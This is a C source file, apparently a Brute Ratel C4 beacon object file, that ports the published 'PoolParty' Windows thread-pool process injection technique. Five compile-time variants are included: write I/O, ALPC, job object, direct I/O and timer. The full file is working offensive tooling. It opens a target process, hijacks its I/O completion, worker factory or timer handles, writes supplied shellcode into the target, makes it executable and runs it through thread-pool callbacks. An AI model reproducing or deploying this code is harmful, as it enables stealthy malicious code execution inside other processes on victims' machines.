// This technique uses the same technique as
// https://www.blackhat.com/eu-23/briefings/schedule/#the-pool-party-you-will-never-forget-new-process-injection-techniques-using-windows-thread-pools-35446
// Original Source: https://github.com/SafeBreach-Labs/PoolParty/
// but is built to support BRc4 BOFs
// This single file contains all variant types

#include "pooling.h"

WCHAR* genRand(SIZE_T length) {
    WCHAR* buff = (WCHAR*)BadgerAlloc((length + 1) * sizeof(WCHAR));
    for (int i = 0; i < length; ++i) {
        buff[i] = (L'A' + Msvcrt$rand() % 26);
    }
    return buff;
}

CHAR* genRandChar(SIZE_T length) {
    CHAR* buff = BadgerAlloc(length + 1);
    for (int i = 0; i < length; ++i) {
        buff[i] = ('A' + Msvcrt$rand() % 26);
    }
    return buff;
}

VOID returnError(CHAR* errorString, NTSTATUS ntError) {
    if (ntError) {
        BadgerDispatch(g_dispatch, "[-] Error %s: 0x%08x\n", errorString, ntError);
    } else {
        BadgerDispatch(g_dispatch, "[-] Error %s: %lu\n", errorString, Kernel32$GetLastError());
    }
}

HANDLE HijackProcessHandle(WCHAR* objectType, HANDLE hProcess, DWORD dwDesiredAccess) {
    ULONG procInfoLen = 0;
    NTSTATUS ntError = STATUS_INFO_LENGTH_MISMATCH;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcInfo = NULL;
    HANDLE hDuplicatedObject = NULL;
    do {
        pProcInfo = (PVOID)BadgerAlloc(procInfoLen);
        ntError = Ntdll$NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)(ProcessHandleInformation), pProcInfo, procInfoLen, &procInfoLen);
    } while (ntError == STATUS_INFO_LENGTH_MISMATCH);
    for (int i = 0; i < pProcInfo->NumberOfHandles; i++) {
        if (Kernel32$DuplicateHandle(hProcess, pProcInfo->Handles[i].HandleValue, (HANDLE)-1, &hDuplicatedObject, dwDesiredAccess, FALSE, (DWORD_PTR)NULL)) {
            ULONG objectLen = 0;
            PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = NULL;
            if (Ntdll$NtQueryObject(hDuplicatedObject, ObjectTypeInformation, pObjectTypeInformation, objectLen, &objectLen) == STATUS_INFO_LENGTH_MISMATCH) {
                pObjectTypeInformation = BadgerAlloc(objectLen);
                if (pObjectTypeInformation) {
                    if (Ntdll$NtQueryObject(hDuplicatedObject, ObjectTypeInformation, pObjectTypeInformation, objectLen, &objectLen) == 0) {
                        if (BadgerWcscmp(objectType, pObjectTypeInformation->TypeName.Buffer) == 0) {
                            BadgerFree((PVOID*)&pObjectTypeInformation);
                            goto cleanUp;
                        }
                    }
                    BadgerFree((PVOID*)&pObjectTypeInformation);
                }
            }
            Kernel32$CloseHandle(hDuplicatedObject);
            hDuplicatedObject = NULL;
        }
    }
cleanUp:
    BadgerFree((PVOID*)&pProcInfo);
    return hDuplicatedObject;
}

#ifdef VARIANT_4
void ExecuteWriteIO(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T shcBufferSize) {
	BadgerDispatch(g_dispatch, "[+] Executing variant 4\n");
    Msvcrt$srand((unsigned int)Msvcrt$_time64((time_t)NULL));
    HANDLE hFile = NULL;
    PFULL_TP_IO pTpIo = NULL;
    PFULL_TP_IO pRemoteTpIo = NULL;
	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
	OVERLAPPED Overlapped = { 0 };
	WCHAR* ioWriteFile = genRand(7);
	CHAR* Buffer = "Hello World";
	SIZE_T BufferLength = sizeof(Buffer);
    DWORD dwOldProtect;
    NTSTATUS ntError = 0;

	hFile = Kernel32$CreateFileW(ioWriteFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (! hFile) {
        returnError("CreateFileW", 0);
        goto cleanUp;
    }
	BadgerDispatch(g_dispatch, "[+] Created I/O file: '%ls'\n", ioWriteFile);
	pTpIo = (PFULL_TP_IO)Kernel32$CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)(shellcode), NULL, NULL);
    if (! pTpIo) {
        returnError("CreateThreadpoolIo", 0);
        goto cleanUp;
    }
	pTpIo->CleanupGroupMember.Callback = shellcode;
	++pTpIo->PendingIrpCount;
	pRemoteTpIo = Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! pRemoteTpIo) {
        returnError("VirtualAllocEx (RW)", 0);
        goto cleanUp;
    }
    if (! Kernel32$WriteProcessMemory(hProcess, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL)) {
        returnError("WriteProcessMemory (RW)", 0);
        goto cleanUp;
    }

	FileIoCopmletionInformation.Port = hIoCompletion;
	FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
	ntError = Ntdll$NtSetInformationFile(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
    if (ntError) {
        returnError("NtSetInformationFile", ntError);
        goto cleanUp;
    }
    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        returnError("VirtualProtectEx (RX)", 0);
        goto cleanUp;
    }
	if (! Kernel32$WriteFile(hFile, Buffer, BufferLength, NULL, &Overlapped)) {
        if (Kernel32$GetLastError() != ERROR_IO_PENDING) {
            returnError("WriteFile", 0);
            goto cleanUp;
        }
    }
	BadgerDispatch(g_dispatch, "[+] Success\n");
cleanUp:
    BadgerFree((PVOID*)&ioWriteFile);
    if (hFile) {
        Kernel32$CloseHandle(hFile);
    }
}
#elif VARIANT_5
void ExecuteALPC(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T shcBufferSize) {
	BadgerDispatch(g_dispatch, "[+] Executing variant 5\n");
	Msvcrt$srand((unsigned int)Msvcrt$_time64((time_t)NULL));
	HANDLE hTmpAlpcPort = NULL;
	HANDLE hAlpcPort = NULL;
	HANDLE hAlpc_ = NULL;
	PFULL_TP_ALPC pTmpTpAlpc = NULL;
    PFULL_TP_ALPC pRemoteTpAlpc = NULL;
    UNICODE_STRING usAlpcPortName = { 0 };
	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;
	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;

    NTSTATUS ntError = 0;
	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
    DWORD dwOldProtect;
	const char* Buffer = "Hello World";
	int BufferLength = sizeof(Buffer);
	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	BadgerMemcpy(ClientAlpcPortMessage.PortMessage, Buffer, sizeof(ClientAlpcPortMessage.PortMessage));
	SIZE_T szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

    WCHAR* portNameInit = L"\\RPC Control\\";
    SIZE_T portNameInitLen = BadgerWcslen(portNameInit)*2;
	WCHAR* portNameEnd = genRand(10);
	WCHAR finalPortName[MAX_PATH] = { 0 } ;
    BadgerMemcpy((PVOID)finalPortName, portNameInit, portNameInitLen);
    BadgerMemcpy((PVOID)finalPortName + portNameInitLen, portNameEnd, BadgerWcslen(portNameEnd)*2);

    Ntdll$RtlInitUnicodeString(&usAlpcPortName, finalPortName);
    InitializeObjectAttributes(&AlpcObjectAttributes, &usAlpcPortName, 0, 0, 0);

	ntError = Ntdll$NtAlpcCreatePort(&hTmpAlpcPort, NULL, NULL);
	if (ntError) {
        returnError("NtAlpcCreatePort (tmp)", ntError);
        return;
	}
	BadgerDispatch(g_dispatch, "[+] Created temporary ALPC port: %d\n", hTmpAlpcPort);

	ntError = Ntdll$TpAllocAlpcCompletion(&pTmpTpAlpc, hTmpAlpcPort, (PTP_ALPC_CALLBACK)shellcode, NULL, NULL);
	if (ntError) {
        returnError("TpAllocAlpcCompletion", ntError);
		return;
	}
	ntError = Ntdll$NtAlpcCreatePort(&hAlpcPort, &AlpcObjectAttributes, &AlpcPortAttributes);
	if (ntError) {
        returnError("NtAlpcCreatePort (pool)", ntError);
		return;
	}
	BadgerDispatch(g_dispatch, "[+] Created thread pool ALPC port '%ls': %d\n", finalPortName, hAlpcPort);

	pRemoteTpAlpc = (PFULL_TP_ALPC) Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! pRemoteTpAlpc) {
        returnError("VirtualAllocEx (RW)", 0);
        return;
    }
	if (! Kernel32$WriteProcessMemory(hProcess, pRemoteTpAlpc, pTmpTpAlpc, sizeof(FULL_TP_ALPC), NULL)) {
        returnError("WriteProcessMemory (RW)", 0);
		return;
    }

	AlpcPortAssociateCopmletionPort.CompletionKey = pRemoteTpAlpc;
	AlpcPortAssociateCopmletionPort.CompletionPort = hIoCompletion;
    ntError = Ntdll$NtAlpcSetInformation(hAlpcPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
	if (ntError) {
        returnError("NtAlpcSetInformation", ntError);
		return;
    }
    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        returnError("VirtualProtectEx (RX)", 0);
        return;
    }
	ntError = Ntdll$NtAlpcConnectPort(&hAlpc_, &usAlpcPortName, &AlpcClientObjectAttributes, &AlpcPortAttributes, 0x20000, NULL, (PPORT_MESSAGE)&ClientAlpcPortMessage, &szClientAlpcPortMessage, NULL, NULL, &liTimeout);
	if (ntError) {
        if (ntError != STATUS_TIMEOUT) {
            returnError("NtAlpcConnectPort", ntError);
            return;
        }
    }
	BadgerDispatch(g_dispatch, "[+] Success\n", finalPortName);
}
#elif VARIANT_6
void ExecuteJobObject(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T shcBufferSize) {
	BadgerDispatch(g_dispatch, "[+] Executing variant 6\n");
	Msvcrt$srand((unsigned int)Msvcrt$_time64((time_t)NULL));
    DWORD dwOldProtect;
    unsigned char *jobName = genRandChar(8);
    HANDLE p_hJob = NULL;
	PFULL_TP_JOB pTpJob = NULL;
    PFULL_TP_JOB RemoteTpJobAddress = NULL;
    NTSTATUS ntError = 0;
	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };

	p_hJob = Kernel32$CreateJobObjectA(NULL, jobName);
	if (! p_hJob) {
		returnError("CreateJobObjectA", 0);
		return;
	}
	BadgerDispatch(g_dispatch, "[+] Created job object: '%s'\n", jobName);

	ntError = Ntdll$TpAllocJobNotification(&pTpJob, p_hJob, shellcode, NULL, NULL);
	if (ntError) {
		returnError("TpAllocJobNotification", ntError);
		return;
	}
	RemoteTpJobAddress = (PFULL_TP_JOB)(Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (! RemoteTpJobAddress) {
        returnError("VirtualAllocEx (RW)", 0);
        return;
    }
	if (! Kernel32$WriteProcessMemory(hProcess, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB), NULL)) {
		returnError("WriteProcessMemory (RW)", 0);
		return;
    }
	if (! Kernel32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
		returnError("SetInformationJobObject", 0);
		return;
    }

	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = hIoCompletion;
	if (! Kernel32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
		returnError("SetInformationJobObject", 0);
		return;
    }
    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        returnError("VirtualProtectEx (RX)", 0);
        return;
    }
	if (! Kernel32$AssignProcessToJobObject(p_hJob, (HANDLE)-1)) {
		returnError("AssignProcessToJobObject", 0);
		return;
    }
	BadgerDispatch(g_dispatch, "[+] Success\n");
}
#elif VARIANT_7
void ExecuteDirectIO(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T shcBufferSize) {
	BadgerDispatch(g_dispatch, "[+] Executing variant 7\n");
    PTP_DIRECT RemoteDirectAddress = NULL;
	TP_DIRECT Direct = { 0 };
	Direct.Callback = shellcode;
    DWORD dwOldProtect;
    NTSTATUS ntError = 0;
	RemoteDirectAddress = (PTP_DIRECT)(Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (! RemoteDirectAddress) {
        returnError("VirtualAllocEx (RW)", 0);
        return;
    }
	if (! Kernel32$WriteProcessMemory(hProcess, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL)) {
		returnError("WriteProcessMemory (RW)", 0);
		return;
    }
    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        returnError("VirtualProtectEx (RX)", 0);
        return;
    }
	BadgerDispatch(g_dispatch, "[+] Created TP_Direct remote memory\n");
	ntError = Ntdll$NtSetIoCompletion(hIoCompletion, RemoteDirectAddress, 0, 0, 0);
    if (ntError) {
		returnError("NtSetIoCompletion", ntError);
		return;
    }
	BadgerDispatch(g_dispatch, "[+] Success\n");
}
#elif VARIANT_8
VOID ExecuteTimerIO(HANDLE hProcess, HANDLE hWorkerFactory, HANDLE hTimer, PVOID shellcode, SIZE_T shcBufferSize) {
	BadgerDispatch(g_dispatch, "[+] Executing variant 8\n");
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
    DWORD dwOldProtect;
    NTSTATUS ntError = 0;
    PFULL_TP_TIMER pTpTimer = NULL;
    PVOID TpTimerWindowStartLinks = NULL;
    PVOID TpTimerWindowEndLinks = NULL;
	LARGE_INTEGER ulDueTime = { 0 };
	T2_SET_PARAMETERS Parameters = { 0 };
	ntError = Ntdll$NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
    if (ntError) {
		returnError("NtQueryInformationWorkerFactory", ntError);
		return;
    }
	pTpTimer = (PFULL_TP_TIMER)Kernel32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(shellcode), NULL, NULL);
    if (! pTpTimer) {
		returnError("CreateThreadpoolTimer", 0);
		return;
    }
	PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)(Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (! RemoteTpTimerAddress) {
        returnError("VirtualAllocEx (RW)", 0);
        return;
    }

	int Timeout = -10000000;
	pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
	pTpTimer->DueTime = Timeout;
	pTpTimer->WindowStartLinks.Key = Timeout;
	pTpTimer->WindowEndLinks.Key = Timeout;
	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
	pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

	if (! Kernel32$WriteProcessMemory(hProcess, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), NULL)) {
        returnError("WriteProcessMemory (RW1)", 0);
        return;
    }
	TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
	if (! Kernel32$WriteProcessMemory(hProcess, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, (PVOID)(&TpTimerWindowStartLinks), sizeof(TpTimerWindowStartLinks), NULL)) {
        returnError("WriteProcessMemory (RW2)", 0);
        return;
    }
	TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
	if (! Kernel32$WriteProcessMemory(hProcess, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, (PVOID)(&TpTimerWindowEndLinks), sizeof(TpTimerWindowEndLinks), NULL)) {
        returnError("WriteProcessMemory (RW3)", 0);
        return;
    }
    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        returnError("WriteProcessMemory (RX)", 0);
        return;
    }
	BadgerDispatch(g_dispatch, "[+] Created TP_Timer remote memory\n");
	ulDueTime.QuadPart = Timeout;
	ntError = Ntdll$NtSetTimer2(hTimer, &ulDueTime, 0, &Parameters);
    if (ntError) {
        returnError("NtSetTimer2", ntError);
        return;
    }
	BadgerDispatch(g_dispatch, "[+] Success\n");
}
#endif

void coffee(char** argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;
	if (argc < 2) {
	    BadgerDispatch(dispatch, "[!] Usage: tpi.o <pid>\n[!] NOTE: configure shellcode to inject using 'set_coffargs'\n");
		return;
	}
    PVOID shellcode = NULL;
	PVOID shcBuffer = argv[0];
	DWORD dwPid = BadgerAtoi(argv[1]);
	DWORD shcBufferSize = BadgerGetBufferSize(argv[0]);
    HANDLE hIoCompletion = NULL;
    HANDLE hWorkerFactory = NULL;
    HANDLE hTimer = NULL;

    HANDLE hProcess = NULL;

    hProcess = Kernel32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (! hProcess) {
        returnError("OpenProcess", 0);
        goto cleanUp;
    }

    #ifdef VARIANT_8
	hWorkerFactory = HijackProcessHandle(L"TpWorkerFactory", hProcess, WORKER_FACTORY_ALL_ACCESS);
    if (! hWorkerFactory) {
        BadgerDispatch(g_dispatch, "[-] No worker factory found in process\n");
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Hijacked worker factory handle\n");
	hTimer = HijackProcessHandle(L"IRTimer", hProcess, TIMER_ALL_ACCESS);
    if (! hTimer) {
        BadgerDispatch(g_dispatch, "[-] No timer threads found in process\n");
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Hijacked timer thread handle\n");
    #else
	hIoCompletion = HijackProcessHandle(L"IoCompletion", hProcess, IO_COMPLETION_ALL_ACCESS);
    if (! hIoCompletion) {
        BadgerDispatch(g_dispatch, "[-] No thread pools found in process\n");
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Hijacked I/O completion handle\n");
    #endif

    shellcode = Kernel32$VirtualAllocEx(hProcess, NULL, shcBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! shellcode) {
        returnError("VirtualAllocEx", 0);
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Shellcode address: 0x%p\n", shellcode);

    if (! Kernel32$WriteProcessMemory(hProcess, shellcode, shcBuffer, shcBufferSize, NULL)) {
        returnError("WriteProcessMemory", 0);
        goto cleanUp;
    }

    #ifdef VARIANT_4
	ExecuteWriteIO(hProcess, hIoCompletion, shellcode, shcBufferSize);
    #elif VARIANT_5
	ExecuteALPC(hProcess, hIoCompletion, shellcode, shcBufferSize);
    #elif VARIANT_6
    ExecuteJobObject(hProcess, hIoCompletion, shellcode, shcBufferSize);
    #elif VARIANT_7
    ExecuteDirectIO(hProcess, hIoCompletion, shellcode, shcBufferSize);
    #elif VARIANT_8
    ExecuteTimerIO(hProcess, hWorkerFactory, hTimer, shellcode, shcBufferSize);
    #endif

cleanUp:
    if (hProcess) {
        Kernel32$CloseHandle(hProcess);
    }
    if (hIoCompletion) {
        Kernel32$CloseHandle(hIoCompletion);
    }
}